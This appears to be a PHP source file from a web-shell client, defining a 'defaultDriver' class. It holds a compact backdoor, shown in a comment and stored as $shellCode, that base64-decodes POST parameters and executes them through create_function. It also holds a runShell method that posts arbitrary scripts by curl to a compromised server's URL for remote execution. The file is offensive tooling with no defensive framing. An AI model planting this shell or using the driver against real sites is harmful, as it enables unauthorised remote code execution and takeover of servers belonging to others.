<?php

/**
 * defaultDriver
 * Shell: 
 * <?php $f=base64_decode($_POST['f']);$p=base64_decode($_POST['p']);$s=$f('',$p);$s(); ?>
 */
class defaultDriver extends ShellDriver {

    public $shellCode = '$f=base64_decode($_POST["f"]);$p=base64_decode($_POST["p"]);$s=$f("",$p);$s();';

    public function runShell($script, $ext = array()) {
        $data = array('f' => 'create_function', 'p' => $script);
        $data = array_map('base64_encode', $data);
        $data = array_merge($ext, $data);
        $ch = curl_init($this->url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

}
